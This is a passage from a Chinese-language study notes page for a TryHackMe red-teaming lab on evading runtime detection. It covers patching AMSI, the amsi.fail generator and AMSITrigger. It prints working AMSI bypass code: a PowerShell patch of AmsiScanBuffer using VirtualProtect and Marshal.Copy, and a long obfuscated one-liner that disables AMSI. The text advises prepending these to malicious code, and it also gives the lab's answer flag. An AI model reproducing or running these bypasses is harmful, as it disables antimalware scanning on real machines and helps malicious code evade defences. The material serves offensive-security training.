<p>我们需要指定要覆盖缓冲区的内容；识别该缓冲区的过程可以在<a href="https://rastamouse.me/memory-patching-amsi-bypass/" target="_blank" rel="noopener noreferrer">这里</a>找到。一旦指定了缓冲区，我们可以使用 <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-6.0" target="_blank" rel="noopener noreferrer">marshal copy</a> 将数据写入进程。</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[system.runtime.interopservices.marshal]::copy(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	$buf, // Opcodes/array to write</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	0, // Where to start copying in source array </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	$BufferAddress, // Where to write (AsmiScanBuffer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	6 // Number of elements/opcodes to write</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">); </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>到此阶段，我们应该已经实现了一个有效的AMSI绕过！需要注意的是，大多数工具会设计特定的签名和检测机制，以识别此类脚本。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>阅读以上内容并在提供的机器上执行/观察脚本。</p><p>执行命令后，输入从桌面获取的标志。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{p47ch1n6_15n7_ju57_f0r_7h3_600d_6uy5}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="automating-for-fun-and-profit---自动化的乐趣与利润">Automating for Fun and Profit - 自动化的乐趣与利润<a href="#automating-for-fun-and-profit---自动化的乐趣与利润" class="hash-link" aria-label="Direct link to Automating for Fun and Profit - 自动化的乐趣与利润" title="Direct link to Automating for Fun and Profit - 自动化的乐趣与利润">​</a></h2>
<p>虽然建议使用本房间中展示的前几种方法，但攻击者也可以使用其他自动化工具来打破 AMSI 签名或编译绕过。</p>
<p>我们将首先查看的自动化工具是 <a href="http://amsi.fail/" target="_blank" rel="noopener noreferrer">amsi.fail</a></p>
<p><a href="http://amsi.fail/" target="_blank" rel="noopener noreferrer">amsi.fail</a> 将从一系列已知的绕过方法中编译并生成一个 PowerShell 绕过代码。根据 amsi.fail 的描述：“AMSI.fail 生成混淆的 PowerShell 代码片段，这些片段可以打破或禁用当前进程的 AMSI。代码片段从一个小池中随机选择技术/变体，然后进行混淆。每个片段在运行时/请求时进行混淆，以确保生成的每个输出都不共享相同的签名。”</p>
<p>下面是来自 amsi.fail 的一个混淆 PowerShell 代码片段示例。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$d=$null;$qcgcjblv=[$((&#x27;Sys&#x27;+&#x27;tem&#x27;).NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).Runtime.InteropServices.Marshal]::AllocHGlobal((9076+7561-7561));$pkgzwpahfwntq=&quot;+(&#x27;lwbj&#x27;+&#x27;cymh&#x27;).NORmaliZe([CHar]([byTe]0x46)+[char](111)+[ChAR]([ByTE]0x72)+[chaR](109*73/73)+[ChAR]([ByTE]0x44)) -replace [char]([bytE]0x5c)+[Char](112*106/106)+[char]([bYte]0x7b)+[chAR]([BYtE]0x4d)+[CHAR](110+8-8)+[CHAr]([BytE]0x7d)&quot;;[Threading.Thread]::Sleep(1595);[Ref].Assembly.GetType(&quot;$((&#x27;Sys&#x27;+&#x27;tem&#x27;).NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$((&#x27;Mãnâge&#x27;+&#x27;ment&#x27;).NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).$((&#x27;Àutõmâtî&#x27;+&#x27;ôn&#x27;).NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).$([CHAR]([ByTe]0x41)+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))&quot;).GetField(&quot;$((&#x27;àmsí&#x27;+&#x27;Sess&#x27;+&#x27;íón&#x27;).norMALiZE([CHaR](70*49/49)+[chAr](87+24)+[ChaR]([bytE]0x72)+[chAr](109)+[chAR](68+43-43)) -replace [CHAr](92)+[chAr]([byTe]0x70)+[CHAr]([bYTE]0x7b)+[cHAr](77*71/71)+[CHar]([bYtE]0x6e)+[char](125+49-49))&quot;, &quot;NonPublic,Static&quot;).SetValue($d, $null);[Ref].Assembly.GetType(&quot;$((&#x27;Sys&#x27;+&#x27;tem&#x27;).NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$((&#x27;Mãnâge&#x27;+&#x27;ment&#x27;).NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).$((&#x27;Àutõmâtî&#x27;+&#x27;ôn&#x27;).NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).$([CHAR]([ByTe]0x41)+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))&quot;).GetField(&quot;$([chAR]([byTe]0x61)+[Char](109+52-52)+[cHar](46+69)+[CHar]([byTe]0x69)+[CHAR]([BYTe]0x43)+[Char]([ByTe]0x6f)+[chAR](110)+[chaR](116*47/47)+[cHar](101)+[CHAR]([bYte]0x78)+[CHaR]([ByTE]0x74))&quot;, &quot;NonPublic,Static&quot;).SetValue($null, [IntPtr]$qcgcjblv);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>您可以像之前的绕过方法一样，将这个绕过代码附加到恶意代码的开头，或者在执行恶意代码之前在同一个会话中运行它。</p>
<hr>
<p><a href="https://github.com/RythmStick/AMSITrigger" target="_blank" rel="noopener noreferrer">AMSITrigger</a> 允许攻击者自动识别会触发签名的字符串，并对其进行修改和绕过。与其他方法相比，这种绕过 AMSI 的方式更为一致，因为您是让文件本身变得干净。</p>
<p>使用 amsitrigger 的语法相对简单；您需要指定文件或 URL 以及扫描文件的格式。以下是运行 amsitrigger 的示例。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\Tryhackme\Tools&gt;AmsiTrigger_x64.exe -i &quot;bypass.ps1&quot; -f 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$MethodDefinition = &quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [DllImport(`&quot;kernel32`&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [DllImport(`&quot;kernel32`&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static extern IntPtr GetModuleHandle(string lpModuleName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [DllImport(`&quot;kernel32`&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name &#x27;Kernel32&#x27; -NameSpace &#x27;Win32&#x27; -PassThru;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$handle = [Win32.Kernel32]::GetModuleHandle(&#x27;amsi.dll&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, &#x27;AmsiScanBuffer&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[UInt32]$Size = 0x5;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[UInt32]$ProtectFlag = 0x40;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[UInt32]$OldProtectFlag = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>签名以红色高亮显示；您可以通过编码、混淆等方式来打破这些签名。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion---总结">Conclusion - 总结<a href="#conclusion---总结" class="hash-link" aria-label="Direct link to Conclusion - 总结" title="Direct link to Conclusion - 总结">​</a></h2>
<p>运行时检测和AMSI只是针对经过强化或保持更新的设备时可能遇到的众多检测和防护手段之一。</p>
<p>这些绕过方法可以单独使用，也可以与其他漏洞和技术结合使用，最终达到绕过所有检测的目的。</p>
<p>重要的是将这些工具保存在你的“后备”工具包中。虽然不能完全依赖它们来绕过所有检测，但使用这些技术可以有效避开很多检测手段。</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/PgUp-code/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Bypassing UAC - 绕过 UAC"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Bypassing UAC - 绕过 UAC</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Evading Logging and Monitoring - 绕过日志记录和监控</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#introduction---简介" class="table-of-contents__link toc-highlight">Introduction - 简介</a><ul><li><a href="#学习目标" class="table-of-contents__link toc-highlight">学习目标</a></li></ul></li><li><a href="#runtime-detections---运行时检测" class="table-of-contents__link toc-highlight">Runtime Detections - 运行时检测</a></li><li><a href="#amsi-概述" class="table-of-contents__link toc-highlight">AMSI 概述</a></li><li><a href="#amsi-的实现机制" class="table-of-contents__link toc-highlight">AMSI 的实现机制</a></li><li><a href="#powershell-downgrade---powershell-降级攻击" class="table-of-contents__link toc-highlight">PowerShell Downgrade - PowerShell 降级攻击</a></li><li><a href="#powershell-reflection---powershell-反射" class="table-of-contents__link toc-highlight">PowerShell Reflection - PowerShell 反射</a></li><li><a href="#patching-amsi---修补-amsi" class="table-of-contents__link toc-highlight">Patching AMSI - 修补 AMSI</a></li><li><a href="#automating-for-fun-and-profit---自动化的乐趣与利润" class="table-of-contents__link toc-highlight">Automating for Fun and Profit - 自动化的乐趣与利润</a></li><li><a href="#conclusion---总结" class="table-of-contents__link toc-highlight">Conclusion - 总结</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">No Copyright © 2025 This is just PgDn's Notes, Sorry. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>